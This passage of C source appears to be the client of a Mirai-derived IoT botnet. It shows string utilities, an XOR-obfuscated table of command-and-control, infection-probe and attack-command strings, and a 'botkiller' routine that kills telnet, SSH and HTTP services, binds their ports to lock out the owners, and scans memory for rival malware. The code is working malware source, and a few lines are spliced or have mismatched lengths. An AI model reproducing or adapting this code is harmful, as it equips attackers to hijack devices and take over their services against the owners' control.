        b = (char) (b >= 'A' && b <= 'Z' ? b | 0x60 : b);

        if (a == b)
        {
            if (++match_count == str_len)
                return (int) (ptr - haystack);
        }
        else
            match_count = 0;
    }

    return -1;
}

BOOL util_strcmp(char *str1, char *str2)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if (l1 != l2)
        return FALSE;

    while (l1--)
    {
        if (*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}
void util_memcpy(void *dst, void *src, int len) {
        char *r_dst = (char *)dst;
        char *r_src = (char *)src;
        while (len--)
                *r_dst++ = *r_src++;
}

int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i, matched = 0;

    if (mem_len > buf_len)
        return -1;

    for (i = 0; i < buf_len; i++)
    {
        if (buf[i] == mem[matched])
        {
            if (++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }

    return -1;
}

int util_strcpy(char *dst, char *src)
{
    int l = util_strlen(src);

    util_memcpy(dst, src, l + 1);

    return l;
}

static inline int util_isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}

static inline int util_isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

static inline int util_isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}

static inline int util_isdigit(char c)
{
    return (c >= '0' && c <= '9');
}

char *util_itoa(int value, int radix, char *string)
{
    if (string == NULL)
        return NULL;

    if (value != 0)
    {
        char scratch[34];
        int neg;
        int offset;
        int c;
        unsigned int accum;

        offset = 32;
        scratch[33] = 0;

        if (radix == 10 && value < 0)
        {
            neg = 1;
            accum = (unsigned int) -value;
        }
        else
        {
            neg = 0;
            accum = (unsigned int)value;
        }

        while (accum)
        {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = (char) c;
            accum /= radix;
            offset--;
        }

        if (neg)
            scratch[offset] = '-';
        else
            offset++;

        util_strcpy(string, &scratch[offset]);
    }
    else
    {
        string[0] = '0';
        string[1] = 0;
    }

    return string;
}

int util_atoi(char *str, int base)
{
	unsigned long acc = 0;
	int c;
	unsigned long cutoff;
	int neg = 0, any, cutlim;

	do {
		c = *str++;
	} while (util_isspace((char) c));
	if (c == '-') {
		neg = 1;
		c = *str++;
	} else if (c == '+')
		c = *str++;

	cutoff = (unsigned long) (neg ? -(unsigned long)LONG_MIN : LONG_MAX);
	cutlim = (int) (cutoff % (unsigned long)base);
	cutoff /= (unsigned long)base;
	for (acc = 0, any = 0;; c = *str++) {
		if (util_isdigit((char) c))
			c -= '0';
		else if (util_isalpha((char) c))
			c -= util_isupper((char) c) ? 'A' - 10 : 'a' - 10;
		else
			break;

		if (c >= base)
			break;

            if (acc == cutoff && c > cutlim) {
                    any = -1;
            } else {
                    if (any < 0 || acc > cutoff)
                            any = -1;
                    else {
                            any = 1;
                            acc *= base;
                            acc += c;
                    }
            }
	}
	if (any < 0) {
		acc = (unsigned long) (neg ? LONG_MIN : LONG_MAX);
	} else if (neg)
		acc = (unsigned long) -acc;
	return (int) (acc);
}


ipv4_t util_local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof (addr);

    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        sockprintf(mainCommSock, "[util] Failed to call socket(), errno = %d\n", errno);
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

//////////////////////
/*   Mirai Floods   */
//////////////////////


//////////////////////
/* Mirai Table Data */
//////////////////////
uint32_t table_key = 0xdeadbeef;

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};
struct table_value table[TABLE_MAX_KEYS];

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy;
    cpy = malloc((size_t) buf_len);

    util_memcpy(cpy, buf, buf_len);
    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

void table_init(void) {
    add_entry(TABLE_CNC_DOMAIN, "", 0);
    add_entry(TABLE_CNC_PORT, "", 0);
    add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 29); // report.changeme.com
    add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2);         // 48101
    add_entry(TABLE_KILLER_SAFE, "\x4A\x56\x56\x52\x51\x18\x0D\x0D\x5B\x4D\x57\x56\x57\x0C\x40\x47\x0D\x46\x73\x55\x16\x55\x1B\x75\x45\x7A\x41\x73\x22", 29);
    add_entry(TABLE_KILLER_PROC, "\x0D\x52\x50\x4D\x41\x0D\x22", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\x0D\x47\x5A\x47\x22", 5);// /exe
    add_entry(TABLE_KILLER_DELETED, "\x02\x0A\x46\x47\x4E\x47\x56\x47\x46\x0B\x22", 11);// (deleted)
    add_entry(TABLE_KILLER_FD, "\x0D\x44\x46\x22", 4); // /fd
    add_entry(TABLE_KILLER_ANIME, "\x0C\x43\x4C\x4B\x4F\x47\x22", 7); //.anime
    add_entry(TABLE_KILLER_STATUS, "\x0D\x51\x56\x43\x56\x57\x51\x22", 8); // /status
    add_entry(TABLE_MEM_QBOT, "\x70\x67\x72\x6D\x70\x76\x02\x07\x51\x18\x07\x51\x22", 13); //REPORT %s:%s
    add_entry(TABLE_MEM_QBOT2, "\x6A\x76\x76\x72\x64\x6E\x6D\x6D\x66\x22", 10); //HTTPFLOOD
    add_entry(TABLE_MEM_QBOT3, "\x6E\x6D\x6E\x6C\x6D\x65\x76\x64\x6D\x22", 10); //LOLNOGTFO
    add_entry(TABLE_MEM_UPX, "\x7E\x5A\x17\x1A\x7E\x5A\x16\x66\x7E\x5A\x16\x67\x7E\x5A\x16\x67\x7E\x5A\x16\x11\x7E\x5A\x17\x12\x7E\x5A\x16\x14\x7E\x5A\x10\x10\x22", 33); //\x58\x4D\x4E\x4E\x43\x50\x46\x22 "zollard xored"
    add_entry(TABLE_MEM_ZOLLARD, "\x58\x4D\x4E\x4E\x43\x50\x46\x22", 8);//zollard
    add_entry(TABLE_MEM_REMAITEN, "\x65\x67\x76\x6E\x6D\x61\x63\x6E\x6B\x72\x22", 11); //GETLOCALIP
    add_entry(TABLE_MEM_REMAITEN2, "\x69\x6B\x6E\x6E\x60\x6D\x76\x71\x22", 9); //KILLBOTS
    add_entry(TABLE_MEM_REMAITEN3, "\x71\x72\x6D\x6D\x64\x71\x22", 7); //SPOOFS
    add_entry(TABLE_MEM_REMAITEN4, "\x69\x6B\x6E\x6E\x63\x6E\x6E\x22", 8); //KILLALL
    add_entry(TABLE_MEM_REMAITEN5, "\x73\x76\x67\x6E\x6C\x67\x76\x22", 8); //QTELNET
    add_entry(TABLE_MEM_REMAITEN6, "\x73\x77\x66\x72\x22", 5); //QUDP
    add_entry(TABLE_MEM_REMAITEN7, "\x73\x76\x61\x72\x22", 5); //QTCP
    add_entry(TABLE_MEM_REMAITEN8, "\x73\x6A\x6D\x6E\x66\x22", 6); //QHOLD
    add_entry(TABLE_MEM_MIRAI, "\x6F\x6B\x70\x63\x6B\x22", 6); //MIRAI
    add_entry(TABLE_MEM_MIRAI2, "\x46\x54\x50\x6A\x47\x4E\x52\x47\x50\x22", 10); //dvrHelper
    add_entry(TABLE_MEM_SATORI, "\x71\x63\x76\x6D\x70\x6B\x22", 7); //SATORI
    add_entry(TABLE_MEM_SATORI2, "\x46\x54\x50\x41\x47\x4E\x52\x47\x50\x22", 10);//dvrcelper
    add_entry(TABLE_SCAN_SHELL, "\x51\x4A\x47\x4E\x4E\x22", 6); //shell
    add_entry(TABLE_SCAN_ENABLE, "\x47\x4C\x43\x40\x4E\x47\x22", 7); //enable
    add_entry(TABLE_SCAN_SYSTEM, "\x51\x5B\x51\x56\x47\x4F\x22", 7); //system
    add_entry(TABLE_SCAN_SH, "\x51\x4A\x22", 3); //sh
    add_entry(TABLE_SCAN_QUERY, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x77\x6E\x76\x70\x6D\x6C\x22", 20); // /bin/busybox ULTRON
    add_entry(TABLE_SCAN_RESP, "\x77\x6E\x76\x70\x6D\x6C\x18\x02\x43\x52\x52\x4E\x47\x56\x02\x4C\x4D\x56\x22", 19); //ULTRON: applet not
    add_entry(TABLE_SCAN_ELF_RESP, "\x7E\x5A\x15\x44\x7E\x5A\x16\x17\x7E\x5A\x16\x41\x7E\x5A\x16\x14\x22", 17); //\x7f\x45\x4c\x46
    add_entry(TABLE_SCAN_NCORRECT, "\x4C\x41\x4D\x50\x50\x47\x41\x56\x22", 9); //ncorrect
    add_entry(TABLE_SCAN_PS, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x52\x51\x22", 16);// /bin/busybox ps
    add_entry(TABLE_SCAN_KILL_9, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x49\x4B\x4E\x4E\x02\x0F\x1B\x02\x22", 22); // /bin/busybox kill -9
    add_entry(TABLE_SCAN_MACHINE_ARM, "\x43\x50\x4F\x22", 4);//arm
    add_entry(TABLE_SCAN_MACHINE_SPARC, "\x51\x52\x43\x50\x41\x22", 6);//sparc
    add_entry(TABLE_SCAN_MACHINE_I686, "\x4B\x14\x1A\x14\x22", 5);//i686
    add_entry(TABLE_SCAN_MACHINE_M68K, "\x4F\x14\x1A\x49\x22", 5);//m68k
    add_entry(TABLE_SCAN_MACHINE_PPC, "\x52\x4D\x55\x47\x50\x52\x41\x22", 8);//powerpc
    add_entry(TABLE_SCAN_MACHINE_ARC, "\x43\x50\x41\x22", 4);//arc
    add_entry(TABLE_SCAN_MACHINE_SH4, "\x51\x57\x52\x47\x50\x4A\x22", 7);//superh
    add_entry(TABLE_SCAN_MACHINE_X86_64, "\x5A\x1A\x14\x7D\x14\x16\x22",7);//x86_64
    add_entry(TABLE_SCAN_MACHINE_MIPS, "\x4F\x4B\x52\x51\x22", 5);//mips
    add_entry(TABLE_SCAN_MACHINE_MIPSEL, "\x4F\x4B\x52\x51\x47\x4E\x22", 7);//mipself
    add_entry(TABLE_SCAN_INFECTION_METHOD_TEST, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x56\x44\x56\x52\x19\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x55\x45\x47\x56\x22", 36);// /bin/busybox tftp;/bin/busybox wget
    add_entry(TABLE_SCAN_WGET_SUCCESS_RESP, "\x77\x51\x43\x45\x47\x18\x02\x56\x44\x56\x52\x22", 12);//Usage: wget
    add_entry(TABLE_SCAN_TFTP_SUCCESS_RESP, "\x77\x51\x43\x45\x47\x18\x02\x56\x44\x56\x52\x22", 12);//Usage: tftp
    add_entry(TABLE_SCAN_PAYLOAD_WGET, "", 0);
    add_entry(TABLE_SCAN_PAYLOAD_TFTP, "", 0);
    add_entry(TABLE_PC_PONG, "\x72\x6B\x6C\x65\x22", 5);//PING
    add_entry(TABLE_PC_UDP, "\x77\x7D\x63\x76\x69\x22", 6);//U_ATK
    add_entry(TABLE_PC_TCP, "\x76\x7D\x63\x76\x69\x22", 6);//T_ATK    add_entry(TABLE_SCAN_INFECTION_METHOD_TEST, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x56\x44\x56\x52\x19\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x55\x45\x47\x56\x22", 36);// /bin/busybox tftp;/bin/busybox wget
    add_entry(TABLE_SCAN_WGET_SUCCESS_RESP, "\x77\x51\x43\x45\x47\x18\x02\x56\x44\x56\x52\x22", 12);//Usage: wget
    add_entry(TABLE_SCAN_TFTP_SUCCESS_RESP, "\x77\x51\x43\x45\x47\x18\x02\x56\x44\x56\x52\x22", 12);//Usage: tftp
    add_entry(TABLE_PC_STD, "\x71\x7D\x63\x76\x69\x22", 6);//S_ATK
    add_entry(TABLE_PC_INIT_TELNET, "\x76\x7D\x71\x61\x63\x6C\x22", 7); //T_SCAN
    add_entry(TABLE_PC_KILLATK, "\x69\x7D\x63\x76\x69\x22", 7); //K_ATK
    add_entry(TABLE_PC_SCAN_KILL, "\x76\x7D\x69\x6B\x6E\x6E\x22", 7); //T_KILL
    add_entry(TABLE_PC_KILL, "\x6E\x6F\x64\x63\x6D\x22", 6); //LMFAO
    add_entry(TABLE_PC_XERXES, "\x7A\x7D\x63\x76\x69\x22", 6);//X_ATK
}
static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = (uint8_t) (table_key & 0xff),
            k2 = (uint8_t) ((table_key >> 8) & 0xff),
            k3 = (uint8_t) ((table_key >> 16) & 0xff),
            k4 = (uint8_t) ((table_key >> 24) & 0xff);

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        sockprintf(mainCommSock, "[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        sockprintf(mainCommSock, "[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        sockprintf(mainCommSock, "[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}


//////////////////////
/* Mirai Botkiller  */
//////////////////////
int killer_pid;
char *killer_realpath;

static BOOL has_exe_access(void)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);

    // Copy /proc/$pid/exe into path
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));

    // Try to open file
    if ((fd = open(path, O_RDONLY)) == -1)
    {
        sockprintf(mainCommSock, "[killer] Failed to open()\n");
        return FALSE;
    }
    close(fd);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);

    if ((k_rp_len = (int) readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        killer_realpath[k_rp_len] = 0;
        sockprintf(mainCommSock, "[killer] Detected we are running out of `%s`\n", killer_realpath);
    }

    util_zero(path, (int) (ptr_path - path));

    return TRUE;
}

static BOOL mem_exists(char *buf, int buf_len, const char *str, int str_len) {
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }
    return FALSE;
}

static BOOL memory_scan_match(char *path) {
    int fd, ret;
    char rdbuf[4096];
    char *m_qbot_report, *m_qbot_http, *m_qbot_dup, *m_upx_str, *m_zollard, *m_remaiten, *m_remaiten2, *m_remaiten3, *m_remaiten4, *m_remaiten5, *m_remaiten6, *m_remaiten7, *m_remaiten8, *m_mirai, *m_mirai2, *m_satori, *m_satori2;

    int m_qbot_len, m_qbot2_len, m_qbot3_len, m_upx_len, m_zollard_len, m_remaiten_len, m_remaiten2_len, m_remaiten3_len,  m_remaiten4_len, m_remaiten5_len,  m_remaiten6_len, m_remaiten7_len, m_remaiten8_len, m_mirai_len, m_mirai2_len, m_satori_len, m_satori2_len;
    BOOL found = FALSE;

    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_MEM_QBOT); //REPORT %s:%s
    table_unlock_val(TABLE_MEM_QBOT2); //HTTPFLOOD
    table_unlock_val(TABLE_MEM_QBOT3); //LOLNOGTFO
    table_unlock_val(TABLE_MEM_UPX); //xored zollard
    table_unlock_val(TABLE_MEM_ZOLLARD); //zolard
    table_unlock_val(TABLE_MEM_REMAITEN); //GETLOCALIP
    table_unlock_val(TABLE_MEM_REMAITEN2); //KILLBOTS
    table_unlock_val(TABLE_MEM_REMAITEN3); //SPOOFS
    table_unlock_val(TABLE_MEM_REMAITEN4); //KILLALL
    table_unlock_val(TABLE_MEM_REMAITEN5); //QTELNET
    table_unlock_val(TABLE_MEM_REMAITEN6); //QUDP
    table_unlock_val(TABLE_MEM_REMAITEN7); //QTCP
    table_unlock_val(TABLE_MEM_REMAITEN8); //QHOLD
    table_unlock_val(TABLE_MEM_MIRAI); //MIRAI
    table_unlock_val(TABLE_MEM_MIRAI2); //dvrHelper
    table_unlock_val(TABLE_MEM_SATORI); //SATORI
    table_unlock_val(TABLE_MEM_SATORI2); //dvrcelper_


    m_qbot_report = table_retrieve_val(TABLE_MEM_QBOT, &m_qbot_len);
    m_qbot_http = table_retrieve_val(TABLE_MEM_QBOT2, &m_qbot2_len);
    m_qbot_dup = table_retrieve_val(TABLE_MEM_QBOT3, &m_qbot3_len);
    m_upx_str = table_retrieve_val(TABLE_MEM_UPX, &m_upx_len);
    m_zollard = table_retrieve_val(TABLE_MEM_ZOLLARD, &m_zollard_len);
    m_remaiten = table_retrieve_val(TABLE_MEM_REMAITEN, &m_remaiten_len);
    m_remaiten2 = table_retrieve_val(TABLE_MEM_REMAITEN2, &m_remaiten2_len);
    m_remaiten3 = table_retrieve_val(TABLE_MEM_REMAITEN3, &m_remaiten3_len);
    m_remaiten4 = table_retrieve_val(TABLE_MEM_REMAITEN4, &m_remaiten4_len);
    m_remaiten5 = table_retrieve_val(TABLE_MEM_REMAITEN5, &m_remaiten5_len);
    m_remaiten6 = table_retrieve_val(TABLE_MEM_REMAITEN6, &m_remaiten6_len);
    m_remaiten7 = table_retrieve_val(TABLE_MEM_REMAITEN7, &m_remaiten7_len);
    m_remaiten8 = table_retrieve_val(TABLE_MEM_REMAITEN8, &m_remaiten8_len);
    m_mirai = table_retrieve_val(TABLE_MEM_MIRAI, &m_mirai_len);
    m_mirai2 = table_retrieve_val(TABLE_MEM_MIRAI2, &m_mirai2_len);
    m_satori = table_retrieve_val(TABLE_MEM_SATORI, &m_satori_len);
    m_satori2 = table_retrieve_val(TABLE_MEM_SATORI2, &m_satori2_len);



    while ((ret = (int) read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||
            mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||
            mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||
            mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||
            mem_exists(rdbuf, ret, m_zollard, m_zollard_len) ||
            mem_exists(rdbuf, ret, m_remaiten, m_remaiten_len) ||
            mem_exists(rdbuf, ret, m_remaiten2, m_remaiten2_len) ||
            mem_exists(rdbuf, ret, m_remaiten3, m_remaiten3_len) ||
            mem_exists(rdbuf, ret, m_remaiten4, m_remaiten4_len) ||
            mem_exists(rdbuf, ret, m_remaiten5, m_remaiten5_len) ||
            mem_exists(rdbuf, ret, m_remaiten6, m_remaiten5_len) ||
            mem_exists(rdbuf, ret, m_remaiten7, m_remaiten6_len) ||
            mem_exists(rdbuf, ret, m_remaiten8, m_remaiten8_len) ||
            mem_exists(rdbuf, ret, m_mirai, m_mirai_len) ||
            mem_exists(rdbuf, ret, m_mirai2, m_mirai2_len) ||
            mem_exists(rdbuf, ret, m_satori, m_satori_len) ||
            mem_exists(rdbuf, ret, m_satori2, m_satori2_len)
            )
            {
                found = TRUE;
                break;
            }
    }
    table_lock_val(TABLE_MEM_QBOT);
    table_lock_val(TABLE_MEM_QBOT2);
    table_lock_val(TABLE_MEM_QBOT3);
    table_lock_val(TABLE_MEM_UPX);
    table_lock_val(TABLE_MEM_ZOLLARD);
    table_lock_val(TABLE_MEM_REMAITEN);
    table_lock_val(TABLE_MEM_REMAITEN2);
    table_lock_val(TABLE_MEM_REMAITEN3);
    table_lock_val(TABLE_MEM_REMAITEN4);
    table_lock_val(TABLE_MEM_REMAITEN5);
    table_lock_val(TABLE_MEM_REMAITEN6);
    table_lock_val(TABLE_MEM_REMAITEN7);
    table_lock_val(TABLE_MEM_REMAITEN8);
    table_lock_val(TABLE_MEM_MIRAI);
    table_lock_val(TABLE_MEM_MIRAI2);
    table_lock_val(TABLE_MEM_SATORI);
    table_lock_val(TABLE_MEM_SATORI2);
    close(fd);

    return found;
}

BOOL killer_kill_by_port(port_t port) {
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

    sockprintf(mainCommSock, "[killer] Finding and killing processes holding port %d\n", ntohs(port));

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);

    fd = open("/proc/net/tcp", O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    // If we failed to find it, lock everything and move on
    if (util_strlen(inode) == 0)
    {
        sockprintf(mainCommSock, "Failed to find inode for port %d\n", ntohs(port));
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);

        return 0;
    }

    sockprintf(mainCommSock, "Found inode \"%s\" for port %d\n", inode, ntohs(port));

    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            // skip all folders that are not PIDs
            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        sockprintf(mainCommSock, "[killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);

    return (BOOL) ret;
}

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = (int) time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    // Let parent continue on main thread
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

    // Kill telnet service and prevent it from restarting
    sockprintf(mainCommSock, "[killer] Trying to kill port 23\n");

    if (killer_kill_by_port(htons(23)))
    {
        sockprintf(mainCommSock, "[killer] Killed tcp/23 (telnet)\n");
    } else {
        sockprintf(mainCommSock, "[killer] Failed to kill port 23\n");
    }
    tmp_bind_addr.sin_port = htons(23);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));

        listen(tmp_bind_fd, 1);
    }

    sockprintf(mainCommSock, "[killer] Bound to tcp/23 (telnet)\n");

    // Kill SSH service and prevent it from restarting
    if (killer_kill_by_port(htons(22)))
    {
        sockprintf(mainCommSock, "[killer] Killed tcp/22 (SSH)\n");
    }
    tmp_bind_addr.sin_port = htons(22);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);

    }
    sockprintf(mainCommSock, "[killer] Bound to tcp/22 (SSH)\n");

    // Kill HTTP service and prevent it from restarting
    if (killer_kill_by_port(htons(80)))
    {
        sockprintf(mainCommSock, "[killer] Killed tcp/80 (http)\n");
    }
    tmp_bind_addr.sin_port = htons(80);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
    sockprintf(mainCommSock, "[killer] Bound to tcp/80 (http)\n");

    // In case the binary is getting deleted, we want to get the REAL realpath
    sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    int killer_realpath_len = 0;

    if (!has_exe_access())
    {
        sockprintf(mainCommSock, "[killer] Machine does not have /proc/$pid/exe\n");
        return;
    }
    sockprintf(mainCommSock, "[killer] Memory scanning processes\n");

    while (TRUE)
    {
        DIR *dir;
        struct dirent *file;

        table_unlock_val(TABLE_KILLER_PROC);
        if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
            sockprintf(mainCommSock, "[killer] Failed to open /proc!\n");
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);

        while ((file = readdir(dir)) != NULL)
        {
            // skip all folders that are not PIDs
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
            char status_path[64], *ptr_status_path = status_path;
            int rp_len, fd;
            int pid;
            pid = atoi(file->d_name);

                scan_counter++;
            if (pid <= killer_highest_pid)
            {
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart scans from lowest PID for process wrap
                {
                    sockprintf(mainCommSock, "[killer] %d seconds have passed since last scan. Re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);

                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1); // Sleep so we can wait for another process to spawn
                }

                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = (int) time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_EXE);

            // Store /proc/$pid/exe into exe_path
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));

            // Store /proc/$pid/status into status_path
